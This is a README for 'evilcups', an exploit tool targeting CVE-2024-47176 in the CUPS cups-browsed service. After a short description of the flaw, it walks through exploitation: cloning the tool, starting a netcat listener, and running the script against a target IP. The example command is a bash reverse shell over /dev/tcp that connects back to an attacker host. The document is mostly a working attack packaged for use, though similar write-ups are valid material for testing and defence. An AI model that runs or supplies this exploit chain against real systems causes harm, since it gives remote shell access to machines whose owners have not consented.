# CVE-2024-47176: Remote Command Execution in CUPS
## Description
CUPS (Common UNIX Printing System) is an open-source printing system that handles networked printers. CVE-2024-47176 specifically targets the cups-browsed functionality, which binds to INADDR_ANY:631, allowing it to trust any packet from any source. By manipulating the Get-Printer-Attributes IPP request, an attacker can send malicious print jobs from a remote system, leading to arbitrary command execution when combined with other vulnerabilities such as CVE-2024-47076 and CVE-2024-47175.
## Steps to Exploit CVE-2024-47176

### Prerequisites
- Access to the target machine with port 631 (IPP) exposed to the internet.
- Python installed on your local machine (for running the exploit script).
- `nmap` installed for scanning the target.

---

### Setup

1. Clone the repository:

    ```bash
    git clone https://github.com/<your-username>/evilcups.git
    cd evilcups
    ```

2. Install the required Python module:

    ```bash
    pip install ippserver
    ```

3. Ensure you have a listener ready to receive a reverse shell on your local machine. You can use `nc` for this:

    ```bash
    nc -lvnp <port>
    ```

## Usage

Run the exploit script with the following syntax:

```bash
./evilcups.py <attacker_ip> <target_ip> "<command>"
```
### For example
```bash
./evilcups.py 10.10.10.10 10.10.11.40 "bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'"
```
